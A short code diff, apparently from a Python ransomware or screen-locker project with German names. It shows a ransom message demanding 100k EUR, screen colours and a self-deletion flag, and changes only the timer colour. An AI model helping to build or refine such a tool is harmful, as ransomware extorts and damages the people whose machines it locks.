@@ -13,7 +13,7 @@ UNTERTEXT = "Pay 100k EUR to get your PC back!"
 HINTERGRUND = "black"
 TEXTFARBE = "red"
 INFOTEXT_FARBE = "white"
-TIMER_FARBE = "gray"
+TIMER_FARBE = "black"
 
 # Selbstlöschung aktivieren? (True = Ja, False = Nein)
 AUTO_DELETE = True 
